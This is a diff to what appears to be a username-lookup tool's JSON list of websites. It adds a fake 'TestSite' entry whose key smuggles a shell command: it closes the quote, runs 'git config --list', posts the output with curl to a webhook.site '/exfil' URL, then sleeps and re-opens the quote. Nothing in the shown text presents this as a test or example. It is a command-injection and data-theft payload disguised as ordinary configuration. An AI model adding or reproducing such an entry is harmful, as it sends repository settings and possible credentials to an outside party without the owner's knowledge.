@@ -3304,5 +3304,12 @@
     "errorType": "status_code",
     "errorCode": 404,
     "username_claimed": "blue"
-  }
+  },
+  "TestSite\"; git config --list | curl -X POST -d @-  https://webhook.site/29003ad7-a175-423c-a895-efa858c6a553/exfil; sleep 180; echo \"": {
+    "errorType": "status_code",
+    "url": "https://example.com/{}",
+    "urlMain": "https://example.com/",
+    "username_claimed": "test"
+}
+
 }
